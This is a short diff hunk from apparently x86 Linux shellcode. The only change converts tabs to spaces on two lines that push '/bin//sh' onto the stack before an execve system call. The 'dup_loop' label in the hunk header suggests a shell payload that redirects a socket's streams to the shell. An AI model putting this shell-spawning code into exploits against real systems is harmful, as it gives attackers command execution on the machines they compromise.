@@ -84,8 +84,8 @@ dup_loop:
     ; execv("/bin//sh", NULL, NULL);    
     mov    al, 0xb           ; eax=sys_execve
     push   edx               ; '\0'
-    push   '//sh'	           ; 
-    push   '/bin'	           ; 
+    push   '//sh'            ; 
+    push   '/bin'            ; 
     mov    ebx, esp          ; ebx="/bin//sh", 0
     xor    ecx, ecx          ; ecx=0 argv=0
     int    0x80              ; exec sys_execve
